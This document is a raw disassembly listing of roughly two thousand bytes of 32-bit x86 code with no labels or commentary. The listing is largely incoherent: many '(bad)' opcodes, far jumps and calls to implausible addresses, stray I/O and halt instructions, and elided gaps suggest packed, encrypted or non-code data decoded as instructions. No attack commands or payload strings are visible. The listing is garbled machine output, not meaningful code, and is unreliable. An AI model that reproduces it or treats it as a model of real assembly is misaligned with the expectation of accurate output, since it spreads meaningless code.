  40b113:	call   0x40227a
  40b118:	fnsave [ebx-0x28]
  40b11b:	idiv   DWORD PTR ds:0x725de7ba
  40b121:	mov    edx,0xb977fffe
  40b126:	idiv   bh
  40b128:	cmp    eax,0x3db851e1
  40b12d:	mov    edx,0xe03245fe
  40b132:	aam    0xfd
  40b134:	sbb    eax,0x1e75feba
  40b139:	loope  0x40b0d6
  40b13b:	mov    cl,BYTE PTR [edx-0x7d3d36fb]
  40b141:	add    eax,0x862e8b55
  40b146:	(bad)  
  40b147:	cld    
  40b148:	rol    BYTE PTR ds:0x367d0d6a,1
  40b14e:	pop    es
  40b14f:	call   0xffd133b7
  40b154:	dec    esp
  40b155:	out    0xc0,al
  40b157:	sti    
  40b158:	mov    ebx,0x63410de8
  40b15d:	dec    edi
  40b15e:	rol    BYTE PTR [edi],1
  40b160:	dec    ebx
  40b161:	ficom  DWORD PTR [edi-0x1]
  40b164:	sub    al,0x60
  40b166:	sar    bl,1
  40b168:	and    al,0xb2
  40b16a:	or     ebp,eax
  40b16c:	in     al,dx
  40b16d:	jns    0x40b1c5
  40b16f:	inc    DWORD PTR [eax]
	...
  40b17d:	add    BYTE PTR [eax],al
  40b17f:	sub    bl,BYTE PTR [ebp-0x1c480001]
  40b185:	sbb    WORD PTR [edi],0x4e9b
  40b18a:	(bad)  
  40b18b:	cld    
  40b18c:	loope  0x40b14d
  40b18e:	sti    
  40b18f:	xchg   ebx,eax
  40b190:	xchg   edi,eax
  40b191:	ror    BYTE PTR [ebx],1
  40b193:	in     al,dx
  40b194:	pop    ecx
  40b195:	push   ds
  40b196:	sub    DWORD PTR [edx-0x16ad94a2],esp
  40b19c:	pop    esi
  40b19d:	add    ecx,DWORD PTR [ebx]
  40b19f:	mov    ds:0x615f8067,eax
  40b1a4:	pop    esi
  40b1a5:	add    eax,edi
  40b1a7:	push   ds
  40b1a8:	xchg   BYTE PTR [ebx],al
  40b1aa:	add    BYTE PTR [ebx+0x5e],ah
  40b1ad:	ds inc ebp
  40b1af:	scas   eax,DWORD PTR es:[edi]
  40b1b0:	xlat   BYTE PTR ds:[ebx]
  40b1b1:	std    
  40b1b2:	jmp    FWORD PTR [esp+eax*1+0x34636a04]
  40b1b9:	add    ebp,DWORD PTR [edx+0x63]
  40b1bc:	loope  0x40b17d
  40b1be:	repz xor ebp,ecx
  40b1c1:	jg     0x40b1b7
  40b1c3:	xchg   esp,eax
  40b1c4:	mov    edi,0x91845055
  40b1c9:	pop    ebx
  40b1ca:	push   esi
  40b1cc:	adc    DWORD PTR [ebx+0x24],ebp
  40b1cf:	jmp    0xa34bb532
  40b1d4:	call   0x3eb:0x541e900
  40b1db:	arpl   bp,bx
  40b1dd:	sub    BYTE PTR [ebx],0xa2
  40b1e0:	add    eax,0xd016
	...
  40b1f1:	add    BYTE PTR [eax+0x5d],bl
  40b1f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1f5:	call   0x89ee:0x33725044
  40b1fc:	cmc    
  40b1fd:	dec    ebp
  40b1fe:	xor    al,0x50
  40b200:	cdq    
  40b201:	mov    cl,0x44
  40b203:	xor    DWORD PTR [edx],0x6c7e2456
  40b209:	push   esp
  40b20a:	adc    al,0x50
  40b20c:	fiadd  WORD PTR [edi+0x55de40de]
  40b212:	or     al,0xb5
  40b214:	inc    eax
  40b215:	scas   al,BYTE PTR es:[edi]
  40b216:	dec    ebp
  40b217:	(bad)  
  40b218:	call   0xb6956871
  40b21d:	push   ebp
  40b21e:	hlt    
  40b21f:	dec    edi
  40b220:	cld    
  40b221:	sbb    al,0x3a
  40b223:	(bad)  
  40b224:	call   0xa6cb8794
  40b229:	push   ebp
  40b22a:	jmp    0x34f:0xd44d8589
  40b231:	add    al,0x3b
  40b233:	loope  0x40b20a
  40b235:	ret    0x4ec4
  40b238:	cmp    al,0x54
  40b23a:	mov    ah,0x4f
  40b23c:	jle    0x40b293
  40b23e:	outs   dx,BYTE PTR ds:[esi]
  40b23f:	sub    al,al
  40b241:	ret    0x67ac
  40b244:	stc    
  40b245:	cdq    
  40b246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b247:	dec    edi
  40b248:	jo     0x40b2c9
  40b24a:	(bad)  
  40b24b:	push   edi
  40b24c:	pop    esi
  40b24d:	push   ebp
  40b24e:	or     DWORD PTR ds:0xc655d2c1,eax
  40b254:	call   0x40b2ad
	...
  40b265:	into   
  40b266:	push   esp
  40b267:	ds push ebp
  40b269:	jl     0x40b2ba
  40b26b:	hlt    
  40b26c:	sbb    al,0x4a
  40b26e:	(bad)  
  40b26f:	(bad)  
  40b270:	call   0x2efa656d
  40b275:	push   cs
  40b276:	jle    0x40b1fd
  40b278:	adc    DWORD PTR [esi+0x6093ff4e],ebp
  40b27e:	fnstsw WORD PTR [ebx-0x22]
  40b281:	and    DWORD PTR [edi-0x2],ecx
  40b284:	push   esp
  40b285:	scas   eax,DWORD PTR es:[edi]
  40b286:	push   esi
  40b287:	inc    DWORD PTR [esi]
  40b289:	xchg   esi,eax
  40b28a:	sbb    BYTE PTR [edi],ah
  40b28c:	shl    BYTE PTR [ecx],1
  40b28e:	dec    edi
  40b28f:	out    0xbd,eax
  40b291:	retf   0xff4e
  40b294:	pusha  
  40b295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b296:	gs mul esi
  40b299:	mov    bh,0x80
  40b29b:	test   ecx,eax
  40b29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b29e:	dec    esi
  40b29f:	(bad)  
  40b2a0:	cmp    edi,edi
  40b2a2:	xlat   BYTE PTR ds:[ebx]
  40b2a3:	sub    BYTE PTR ss:[edi+0x4e],bl
  40b2a7:	mov    ch,0xb9
  40b2a9:	scas   eax,DWORD PTR es:[edi]
  40b2aa:	dec    esi
  40b2ab:	(bad)  
  40b2ac:	mov    esi,0x28292665
  40b2b1:	addr16 pop ebp
  40b2b3:	adc    DWORD PTR [ebx-0x71],esi
  40b2b6:	dec    esi
  40b2b7:	or     ebp,DWORD PTR [ecx+0x5c82f3ac]
  40b2bd:	cwde   
  40b2be:	push   esi
  40b2bf:	call   DWORD PTR [esi-0x71f62634]
  40b2c5:	jo     0x40b345
  40b2c7:	test   DWORD PTR [ebp+0x0],esp
	...
  40b2d5:	add    BYTE PTR [eax],al
  40b2d7:	add    BYTE PTR [edi],ch
  40b2d9:	dec    esi
  40b2da:	call   DWORD PTR [edx-0x6a7ab996]
  40b2e0:	pop    ds
  40b2e1:	dec    esi
  40b2e2:	call   esp
  40b2e4:	pusha  
  40b2e5:	add    eax,0x3308b900
  40b2ea:	mov    dh,0x5e
  40b2ec:	das    
  40b2ed:	add    BYTE PTR [ebp-0xb1e0c7],0xb9
  40b2f4:	js     0x40b2a5
  40b2f6:	ss add bl,cl
  40b2f9:	add    bh,bh
  40b2fb:	mov    ch,0x3a
  40b2fd:	sar    esi,0xff
  40b300:	xor    eax,0xbb2926ff
  40b305:	add    ch,al
  40b307:	int    0xc3
  40b309:	mov    ecx,0x3e8a0bfe
  40b30e:	adc    al,BYTE PTR [ebx-0x8ed49]
  40b314:	push   ebp
  40b315:	dec    esi
  40b316:	je     0x40b322
  40b318:	repnz mov es,WORD PTR gs:[ebp-0x13eb2]
  40b320:	popa   
  40b321:	cld    
  40b322:	mov    BYTE PTR [ebp-0x13eb2],0xa
  40b329:	add    al,BYTE PTR [eax]
  40b32b:	add    BYTE PTR [edx-0x4f],bl
  40b32e:	lea    esi,[esi-0x427d4dcb]
  40b334:	push   ds
  40b335:	stos   BYTE PTR es:[edi],al
  40b336:	(bad)  
  40b337:	dec    DWORD PTR [edx]
  40b339:	ss add DWORD PTR ds:[eax],0x0
	...
  40b34a:	add    BYTE PTR [edi+0xd],dh
  40b34d:	idiv   edi
  40b34f:	mov    ch,0x6
  40b351:	jne    0x40b389
  40b353:	mov    al,ds:0x16858d09
  40b358:	stos   BYTE PTR es:[edi],al
  40b359:	(bad)  
  40b35a:	call   FWORD PTR [edx-0x121b4b4e]
  40b360:	mov    cl,0xfe
  40b362:	call   0x3fd15f
  40b367:	mov    cl,0xc1
  40b369:	jae    0x40b374
  40b36b:	dec    ecx
  40b36c:	je     0x40b33a
  40b36e:	div    DWORD PTR ds:0x8f74ffb2
  40b374:	mov    dl,0xb4
  40b376:	in     al,0x3d
  40b378:	mov    dl,0xfe
  40b37a:	call   0x401f59
  40b37f:	arpl   WORD PTR [edi],bx
  40b381:	mov    esp,esp
  40b383:	mov    WORD PTR [esi+0x5c630052],?
  40b389:	add    eax,DWORD PTR [ebx-0xa5384a]
  40b38f:	ins    BYTE PTR es:[edi],dx
  40b390:	pop    ebx
  40b391:	xlat   BYTE PTR ds:[ebx]
  40b392:	push   0xffffffe0
  40b394:	loopne 0x40b3f5
  40b396:	neg    DWORD PTR [esp+0x4]
  40b39a:	je     0x40b35d
  40b39c:	fist   WORD PTR [eax+0x52f454e8]
  40b3a2:	add    bh,cl
  40b3a4:	xchg   ebp,eax
  40b3a5:	fild   DWORD PTR [ecx]
  40b3a7:	arpl   bx,si
  40b3a9:	xchg   ecx,eax
  40b3aa:	jmp    FWORD PTR [esi+0xa75b56]
	...
  40b3bc:	add    BYTE PTR [eax],al
  40b3be:	icebp  
  40b3bf:	push   ebx
  40b3c0:	push   edx
  40b3c1:	(bad)  
  40b3c2:	out    dx,al
  40b3c3:	dec    edx
  40b3c4:	pop    edx
  40b3c5:	call   FWORD PTR [esp+eiz*2]
  40b3c8:	fadd   DWORD PTR [edi]
  40b3ca:	or     ebp,DWORD PTR [eax-0x6b]
  40b3cd:	dec    DWORD PTR [esp+esi*1]
  40b3d0:	cwde   
  40b3d1:	call   0xff92efe2
  40b3d6:	jbe    0x40b42e
  40b3d8:	pop    ebx
  40b3d9:	in     eax,dx
  40b3da:	mov    cl,0x8b
  40b3dc:	push   edx
  40b3dd:	push   DWORD PTR [esi-0x1b00a55e]
  40b3e3:	fwait
  40b3e4:	cwde   
  40b3e5:	in     al,0xd4
  40b3e7:	mov    ds:0x564eff52,eax
  40b3ec:	pop    ebx
  40b3ed:	lods   eax,DWORD PTR ds:[esi]
  40b3ee:	adc    DWORD PTR [edx+edx*2-0x1],esi
  40b3f2:	push   cs
  40b3f3:	fwait
  40b3f4:	pop    edx
  40b3f5:	(bad)  
  40b3f6:	mov    esp,0xcb07d883
  40b3fb:	cmc    
  40b3fc:	xchg   ebp,eax
  40b3fd:	jmp    FWORD PTR [ebx+edx*8-0x24531f69]
  40b404:	push   ecx
  40b405:	call   DWORD PTR [esi]
  40b407:	add    eax,0x97d65bf1
  40b40c:	pop    esi
  40b40d:	push   edx
  40b40e:	mov    WORD PTR [edx+0x4c845a4d],ss
  40b414:	inc    ecx
  40b415:	dec    edx
  40b416:	mov    dh,0x4c
  40b418:	inc    esi
  40b419:	push   edx
  40b41a:	scas   al,BYTE PTR es:[edi]
  40b41b:	pop    ecx
  40b41c:	ss push edx
  40b41e:	ins    BYTE PTR es:[edi],dx
  40b41f:	pop    ebp
  40b420:	jne    0x40b3ba
	...
  40b42e:	add    BYTE PTR [eax],al
  40b430:	add    BYTE PTR [esp+ecx*2+0x2e],ah
  40b434:	cwde   
  40b435:	dec    ebx
  40b436:	push   esp
  40b437:	es push edx
  40b439:	dec    ebx
  40b43a:	xchg   esi,eax
  40b43b:	push   esp
  40b43c:	push   edx
  40b43d:	dec    esp
  40b43e:	dec    esp
  40b43f:	pop    esp
  40b440:	arpl   WORD PTR [esp+ecx*2+0xe],cx
  40b444:	pop    ebx
  40b445:	add    eax,0x34520692
  40b44a:	xchg   edx,eax
  40b44b:	stc    
  40b44c:	pop    ecx
  40b44d:	sub    al,0x4c
  40b44f:	add    DWORD PTR [esi-0x12],ebp
  40b452:	dec    ebx
  40b453:	out    dx,al
  40b454:	push   ecx
  40b455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b456:	dec    ebp
  40b457:	rcl    BYTE PTR [esi+edx*1-0x69ae21b4],1
  40b45e:	dec    ecx
  40b45f:	shl    DWORD PTR [edi-0x24],0x4
  40b463:	jmp    0xe93dd5a2
  40b468:	mov    dh,0xe9
  40b46a:	pop    eax
  40b46b:	push   0x48
  40b46d:	neg    esi
  40b46f:	call   0x348d0b51
  40b474:	cld    
  40b475:	les    ebx,FWORD PTR [ecx+0x7dd4515b]
  40b47b:	and    al,0x50
  40b47d:	cmp    eax,DWORD PTR ds:0xdd0560e9
  40b483:	mov    al,0x1a
  40b485:	and    al,BYTE PTR ds:0xc66d6711
  40b48b:	call   0x3deae0
  40b490:	or     BYTE PTR [ebp+ebp*1+0x6eff],0x0
	...
  40b4a4:	sbb    al,0xc2
  40b4a6:	idiv   DWORD PTR [ecx-0x57c8e548]
  40b4ac:	pusha  
  40b4ad:	(bad)  
  40b4af:	pop    ds
  40b4b0:	mov    al,ds:0x4a14fe4b
  40b4b5:	push   ds
  40b4b6:	inc    ecx
  40b4b7:	jmp    0x3ef863d4
  40b4bc:	adc    al,BYTE PTR [eax]
  40b4be:	sar    BYTE PTR [ebp+0x35457e3a],0x3f
  40b4c5:	push   es
  40b4c6:	add    BYTE PTR [esi],dl
  40b4c8:	icebp  
  40b4c9:	dec    edx
  40b4ca:	jne    0x40b4bd
  40b4cc:	test   al,0x92
  40b4ce:	mov    cl,0x16
  40b4d0:	mov    dl,0x4a
  40b4d2:	jne    0x40b4e5
  40b4d4:	xchg   edx,eax
  40b4d5:	shl    bl,1
  40b4d7:	push   es
  40b4d8:	or     al,0x3
  40b4da:	call   0xff8b84fd
  40b4df:	test   BYTE PTR ds:0xf5d1e857,0x4a
  40b4e6:	call   DWORD PTR [ecx+0x7a]
  40b4e9:	adc    al,BYTE PTR [ecx-0x17]
  40b4ec:	mov    bl,0xd0
  40b4ee:	pop    es
  40b4ef:	shl    DWORD PTR [edx-0x6c3100b7],0xd0
  40b4f6:	sti    
  40b4f7:	(bad)  
  40b4f8:	or     eax,0xd53fe803
  40b4fd:	dec    edx
  40b4fe:	jmp    DWORD PTR [eax+0x1400019e]
  40b504:	pop    esi
  40b505:	pop    ecx
  40b506:	sub    DWORD PTR [ebp+0x0],0x0
	...
  40b515:	add    BYTE PTR [eax],al
  40b517:	and    al,0xdf
  40b519:	call   DWORD PTR [edx]
  40b51b:	bound  ecx,QWORD PTR [edx+0x75]
  40b51e:	loope  0x40b548
  40b520:	daa    
  40b521:	mov    dl,0x8e
  40b523:	adc    edi,DWORD PTR [ebp+eax*2+0x0]
  40b527:	fisubr WORD PTR [esi]
  40b529:	(bad)  
  40b52a:	(bad)  
  40b52b:	fnsave [eax+ebp*2-0x78]
  40b52f:	in     eax,0x47
  40b531:	jmp    DWORD PTR [edi+0x36]
  40b534:	in     eax,dx
  40b535:	inc    eax
  40b536:	add    ch,bh
  40b538:	xor    al,BYTE PTR [edi]
  40b53a:	call   0x3fd46f
  40b53f:	sub    eax,0x97fffb33
  40b544:	dec    esi
  40b545:	out    0x43,eax
  40b547:	clc    
  40b548:	mov    ah,0xfe
  40b54a:	leave  
  40b54b:	cmp    BYTE PTR [edx],al
  40b54d:	add    BYTE PTR [ebp+0x1],dl
  40b550:	stos   BYTE PTR es:[edi],al
  40b551:	add    ah,0x8e
  40b554:	sub    bh,bh
  40b556:	imul   ebx,DWORD PTR [edx-0x4b],0xdd720874
  40b55d:	mov    al,0xff
  40b55f:	ins    DWORD PTR es:[edi],dx
  40b560:	iret   
  40b561:	inc    esp
  40b562:	cld    
  40b563:	loop   0x40b56a
  40b565:	add    bh,ch
  40b567:	pushf  
  40b568:	cs popf 
  40b56a:	aaa    
  40b56b:	sti    
  40b56c:	add    eax,0x46e5a368
  40b571:	(bad)  
  40b572:	(bad)  
  40b573:	xchg   edi,eax
  40b574:	dec    esi
  40b575:	out    0xaf,eax
  40b577:	and    edi,DWORD PTR [edx+0x6afe]
	...
  40b589:	add    dl,bh
  40b58b:	sub    eax,0x13b37df
  40b590:	push   0xff4055c6
  40b595:	(bad)  
  40b596:	mul    DWORD PTR [edx]
  40b598:	sub    DWORD PTR [ecx-0x6],eax
  40b59b:	lods   eax,DWORD PTR ds:[esi]
  40b59c:	xchg   ebp,eax
  40b59d:	mov    bh,0xad
  40b59f:	mov    ecx,0x1d96c00a
  40b5a4:	push   0xff40b5bc
  40b5a9:	dec    edi
  40b5aa:	repnz data16 mov bh,0xff
  40b5ae:	arpl   WORD PTR [ebx-0x4c],si
  40b5b1:	arpl   WORD PTR [si+0x5e],bx
  40b5b5:	mov    esi,0x4116e24b
  40b5ba:	arpl   sp,bp
  40b5bc:	dec    esi
  40b5bd:	jne    0x40b61a
  40b5bf:	test   BYTE PTR [edx],bl
  40b5c1:	fstp   DWORD PTR [edx+ebx*8-0x1d30a9a5]
  40b5c8:	dec    esi
  40b5c9:	call   DWORD PTR [esi]
  40b5cb:	test   al,0x4e
  40b5cd:	jne    0x40b62a
  40b5cf:	les    edi,FWORD PTR [ecx+esi*4]
  40b5d2:	jl     0x40b58e
  40b5d4:	cmp    al,0xc2
  40b5d6:	pop    edi
  40b5d7:	pop    esp
  40b5d8:	mov    eax,0x47de7f8a
  40b5dd:	cld    
  40b5de:	or     eax,0xcaffd96b
  40b5e3:	sub    eax,0xf66b754e
  40b5e8:	fidiv  DWORD PTR [eax+0x457ce84c]
	...
  40b5fa:	add    BYTE PTR [eax],al
  40b5fc:	add    BYTE PTR [edi-0x1c],al
  40b5ff:	sbb    BYTE PTR [eax-0x75],al
  40b602:	popf   
  40b603:	add    ecx,DWORD PTR [ebx+0x411b9a76]
  40b609:	arpl   si,bx
  40b60b:	push   cs
  40b60c:	add    BYTE PTR [edi+0x54ebdba3],ch
  40b612:	popf   
  40b613:	add    edx,DWORD PTR [edi+0xb]
  40b616:	outs   dx,DWORD PTR ds:[esi]
  40b617:	test   DWORD PTR [eax],eax
  40b619:	arpl   WORD PTR [ebx+0x43],dx
  40b61c:	je     0x40b65c
  40b61e:	or     BYTE PTR [ebx+edx*8-0x42],bl
  40b622:	aaa    
  40b623:	dec    esi
  40b624:	push   0xffc447ee
  40b629:	pushf  
  40b62a:	ss push ecx
  40b62c:	mov    bh,0xe4
  40b62e:	(bad)  
  40b62f:	mov    bl,0x67
  40b631:	arpl   WORD PTR [esi+0x5e],bx
  40b634:	mov    esi,0xd8a60533
  40b639:	fs pop ebp
  40b63b:	ret    
  40b63c:	cmp    ah,al
  40b63e:	dec    eax
  40b63f:	sbb    DWORD PTR [edx-0x10],0x625a8e48
  40b646:	mov    edi,0xd2630d68
  40b64b:	add    ch,0xa8
  40b64e:	adc    al,0xa9
  40b650:	mov    WORD PTR [eax+ecx*2-0x686eb192],ds
  40b657:	and    DWORD PTR [edi],eax
  40b659:	push   ss
  40b65a:	xchg   edx,eax
  40b65b:	pop    esi
  40b65c:	fmul   DWORD PTR [eax+0xfbdc48]
	...
  40b66e:	add    BYTE PTR [eax],al
  40b670:	test   al,al
  40b672:	xchg   edi,eax
  40b673:	dec    esi
  40b674:	je     0x40b61e
  40b676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b677:	cmp    al,0xa1
  40b679:	add    ecx,ebp
  40b67b:	mov    eax,0x476a59d9
  40b680:	pop    edi
  40b681:	fucomi st,st(0)
  40b683:	fnstenv [edx+0x48]
  40b686:	pushf  
  40b687:	sti    
  40b688:	inc    esp
  40b689:	pop    esi
  40b68a:	pop    ecx
  40b68b:	dec    esi
  40b68c:	inc    esp
  40b68d:	jle    0x40b63b
  40b68f:	dec    edi
  40b690:	retf   
  40b691:	add    eax,0xdcf55ee9
  40b696:	out    dx,eax
  40b697:	or     esp,DWORD PTR [edx+0x6b039105]
  40b69d:	(bad)  
  40b69e:	call   0x13e4cf1
  40b6a3:	xchg   esp,eax
  40b6a4:	cmp    ecx,DWORD PTR [eax-0x1a]
  40b6a7:	dec    ebp
  40b6a8:	xchg   esi,eax
  40b6a9:	dec    ecx
  40b6aa:	(bad)  
  40b6ac:	pop    esp
  40b6ad:	pop    ebp
  40b6ae:	jecxz  0x40b642
  40b6b0:	cld    
  40b6b1:	inc    edi
  40b6b2:	mov    al,ds:0x1c055f42
  40b6b7:	jns    0x40b6b8
  40b6b9:	test   DWORD PTR [ebp+0x47ec30],esp
  40b6bf:	mov    dh,0x5c
  40b6c1:	ret    0x19fb
  40b6c4:	ror    BYTE PTR es:[ebx],cl
  40b6c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6c8:	je     0x40b6ea
  40b6ca:	sub    DWORD PTR [eax],ebp
  40b6cc:	pop    edi
  40b6cd:	pop    ebp
  40b6ce:	int    0x6c
  40b6d0:	addr16 add eax,0xa90b
	...
  40b6e2:	add    BYTE PTR [esi+0x60e8a180],dh
  40b6e8:	add    eax,0x51724c7
  40b6ed:	add    cl,ch
  40b6ef:	pusha  
  40b6f0:	inc    eax
  40b6f1:	inc    ebp
  40b6f2:	jne    0x40b71a
  40b6f4:	add    BYTE PTR [eax],al
  40b6f6:	jmp    0xe9a9fea5
  40b6fb:	stos   BYTE PTR es:[edi],al
  40b6fc:	inc    edi
  40b6fd:	imul   ebp,ecx,0xb9f3c1fd
  40b703:	cmc    
  40b704:	xor    esp,0x50481e3e
  40b70a:	mov    WORD PTR ds:[edi-0x1],cs
  40b70e:	mov    esp,0x649f5dac
  40b713:	pop    edi
  40b714:	add    eax,0x22b290b
  40b719:	jmp    0x4618a3
  40b71e:	or     eax,0xa7e9411d
  40b724:	ror    BYTE PTR [ebx],1
  40b726:	adc    DWORD PTR [ecx-0xf010071],esp
  40b72c:	jnp    0x40b6fe
  40b72e:	fs in  al,0x51
  40b731:	imul   esi
  40b733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b734:	mov    ch,0x51
  40b736:	shl    edx,1
  40b738:	(bad)  
  40b739:	(bad)  
  40b73a:	fimul  WORD PTR [ecx-0x50210f80]
  40b740:	inc    esi
  40b741:	call   0xff878b27
	...
  40b756:	nop
  40b757:	add    DWORD PTR [eax+0x26],ebp
  40b75a:	bound  eax,QWORD PTR [edx-0x1]
  40b75d:	(bad)  
  40b75e:	pop    edi
  40b75f:	mov    dl,0xf6
  40b761:	inc    DWORD PTR ds:0xb32734ba
  40b767:	inc    ebx
  40b768:	jmp    edi
  40b76a:	shl    BYTE PTR [eax-0x1],cl
  40b76d:	inc    DWORD PTR [ebx+0x7f]
  40b770:	in     al,0xf7
  40b772:	in     eax,0xb9
  40b774:	imul   eax,DWORD PTR [eax],0x41374f52
  40b77a:	mov    edx,0x1df0b4b9
  40b77f:	mov    ecx,0x21cffffe
  40b784:	sub    DWORD PTR [ecx+0x7a],eax
  40b787:	stos   BYTE PTR es:[edi],al
  40b788:	jmp    0x88f9dd42
  40b78d:	test   DWORD PTR [esi],esp
  40b78f:	mov    cl,0xfe
  40b791:	jmp    DWORD PTR [eax+0x621d6802]
  40b797:	inc    edx
  40b798:	(bad)  
  40b799:	(bad)  
  40b79a:	out    dx,eax
  40b79b:	mov    cl,0xf6
  40b79d:	call   DWORD PTR [ebp+0x632734b9]
  40b7a3:	inc    edx
  40b7a4:	jmp    edi
  40b7a6:	xchg   esi,eax
  40b7a7:	outs   dx,DWORD PTR ds:[esi]
  40b7a8:	(bad)  
  40b7a9:	call   ebx
  40b7ab:	jg     0x40b795
  40b7ad:	not    DWORD PTR [ebp-0x47]
  40b7b0:	mov    WORD PTR [ebp-0x14e7a],es
  40b7b6:	retf   0x2e29
  40b7b9:	cmp    BYTE PTR [eax],al
	...
  40b7c7:	add    BYTE PTR [eax],al
  40b7c9:	sti    
  40b7ca:	add    edi,edi
  40b7cc:	mov    ch,0x1a
  40b7ce:	mov    dl,0xfe
  40b7d0:	inc    DWORD PTR ds:0x3b2926f0
  40b7d6:	add    eax,ebp
  40b7d8:	test   eax,0xbfeb9ef
  40b7dd:	arpl   WORD PTR [eax+edx*8+0x2878e018],bx
  40b7e4:	imul   esp
  40b7e6:	add    BYTE PTR ds:[ebp+0x53],dh
  40b7ea:	xchg   DWORD PTR [edi+ecx*4],edx
  40b7ed:	out    0x3b,al
  40b7ef:	push   ebx
  40b7f0:	call   esp
  40b7f2:	jmp    0x40b84f
  40b7f4:	jbe    0x40b807
  40b7f6:	lahf   
  40b7f7:	dec    ebx
  40b7f8:	jmp    0x40b869
  40b7fa:	push   ebx
  40b7fb:	inc    ebx
  40b7fc:	je     0x40b863
  40b7fe:	or     al,0x5c
  40b800:	push   0xfffffff1
  40b802:	jbe    0x40b84f
  40b804:	(bad)  
  40b805:	out    0x7b,al
  40b807:	push   ebx
  40b808:	jmp    DWORD PTR [eax+esi*1-0x249cfffd]
  40b80f:	mov    ah,ah
  40b811:	mov    esi,ss
  40b813:	dec    edx
  40b814:	add    BYTE PTR [edi],dl
  40b816:	xchg   DWORD PTR [esi+0x4aae77bd],eax
  40b81c:	jmp    DWORD PTR [ebx+0x28]
  40b81f:	mov    ecx,0x52c3b682
  40b824:	jmp    FWORD PTR [ebx+ebx*2-0x31]
  40b828:	inc    esp
  40b829:	sti    
  40b82a:	pop    ebx
  40b82b:	add    ebp,edi
	...
  40b839:	add    BYTE PTR [eax],al
  40b83b:	add    BYTE PTR ds:0x4b07d0fc,bl
  40b841:	out    dx,al
  40b842:	cdq    
  40b843:	dec    DWORD PTR [esp+ebp*8-0x70]
  40b847:	in     al,dx
  40b848:	dec    esp
  40b849:	and    al,0x4b
  40b84b:	push   DWORD PTR [esi+0x4155b26]
  40b851:	adc    al,0x4b
  40b853:	push   esi
  40b855:	push   ss
  40b856:	push   ebx
  40b857:	jmp    DWORD PTR [esp+eax*2]
  40b85a:	rol    BYTE PTR [edi],1
  40b85c:	or     esi,DWORD PTR [edx+ebx*4]
  40b85f:	call   DWORD PTR [esp+esi*1]
  40b862:	nop
  40b863:	in     al,0x14
  40b865:	push   es
  40b866:	out    0x4a,al
  40b868:	add    al,0xbb
  40b86a:	lock pop ebx
  40b86c:	cli    
  40b86d:	jae    0x40b845
  40b86f:	dec    edx
  40b870:	hlt    
  40b871:	jp     0x40b83c
  40b873:	push   edx
  40b874:	in     al,dx
  40b875:	inc    esp
  40b876:	(bad)  
  40b877:	rcr    BYTE PTR [ebp+ebp*1+0x70],1
  40b87b:	cdq    
  40b87c:	fadd   QWORD PTR [esi+esi*4-0x70]
  40b880:	mov    edi,0xbb4aae3c
  40b885:	cmp    bl,BYTE PTR [eax+0x4a]
  40b888:	les    eax,FWORD PTR [esp+edx*2+0x57]
  40b88c:	mov    ah,0x44
  40b88e:	xchg   esi,eax
  40b88f:	pop    ebx
  40b890:	leave  
  40b891:	jbe    0x40b821
  40b893:	dec    edx
  40b894:	lods   al,BYTE PTR ds:[esi]
  40b895:	jp     0x40b828
  40b897:	push   edx
  40b898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b899:	inc    esp
  40b89a:	xchg   ecx,eax
  40b89b:	sub    dl,dl
  40b89d:	inc    esp
  40b89e:	jbe    0x40b8ea
	...
  40b8ac:	add    BYTE PTR [eax],al
  40b8ae:	add    dh,cl
  40b8b0:	xor    eax,0x2d8c4a76
  40b8b5:	cmp    eax,0x5e448494
  40b8ba:	shl    BYTE PTR [esi+ebp*1-0x39],0x49
  40b8bf:	je     0x40b905
  40b8c1:	dec    esi
  40b8c2:	shr    BYTE PTR [eax+0x2d],1
  40b8c5:	out    0x7f,eax
  40b8c7:	arpl   WORD PTR ds:0x56b4530,ax
  40b8cd:	pushf  
  40b8ce:	jle    0x40b917
  40b8d0:	mov    BYTE PTR ds:0x9305b947,ah
  40b8d6:	test   BYTE PTR [ebp-0x46],0xf0
  40b8da:	pop    ebx
  40b8db:	inc    ebp
  40b8dc:	jae    0x40b8f4
  40b8de:	dec    edx
  40b8df:	jmp    0xa7fd:0x75db0cc9
  40b8e6:	add    esp,DWORD PTR [edx+edi*4]
  40b8e9:	lock pop ebx
  40b8eb:	jne    0x40b930
  40b8ed:	add    dh,dh
  40b8ef:	stos   BYTE PTR es:[edi],al
  40b8f0:	inc    esp
  40b8f1:	jne    0x40b8e0
  40b8f3:	call   0xff73:0x10d107ba
  40b8fa:	fidivr WORD PTR [eax]
  40b8fc:	inc    edi
  40b8fd:	add    al,0xe9
  40b8ff:	lds    ecx,FWORD PTR [esi+0x41a36aec]
  40b905:	push   0xffffffe9
  40b907:	push   es
  40b908:	sbb    bh,bh
  40b90a:	xor    al,0xdf
  40b90c:	sub    esi,DWORD PTR [ebp-0x76bbd579]
  40b912:	and    al,0x0
	...
  40b920:	add    BYTE PTR [eax],al
  40b922:	sbb    ebp,DWORD PTR [ebp-0x7cd41701]
  40b928:	push   0xffc66f08
  40b92d:	add    dl,dh
  40b92f:	sti    
  40b930:	inc    eax
  40b931:	jmp    0x91487351
  40b936:	pushf  
  40b937:	pop    ecx
  40b938:	(bad)  
  40b939:	jle    0x40b965
  40b93b:	mov    edx,0xba476fb
  40b940:	call   0xff84a2dc
  40b945:	xor    BYTE PTR ds:0xffb40009,bl
  40b94b:	xor    BYTE PTR [ecx-0xc3b8d3],al
  40b951:	dec    esi
  40b952:	hlt    
  40b953:	leave  
  40b954:	sti    
  40b955:	cdq    
  40b956:	sbb    edi,DWORD PTR [edx-0x1593c1f5]
  40b95c:	sub    BYTE PTR [eax+0x6a992d60],ch
  40b962:	addr16 add eax,0x8a4a290b
  40b968:	int    0xe8
  40b96a:	pusha  
  40b96b:	add    eax,0x5a8acc7
  40b970:	add    cl,ch
  40b972:	pusha  
  40b973:	dec    edx
  40b974:	inc    ebp
  40b975:	add    BYTE PTR [esi],ah
  40b977:	into   
  40b978:	push   es
  40b979:	add    BYTE PTR [edx],cl
  40b97b:	popa   
  40b97c:	jmp    FWORD PTR [ecx+0xa]
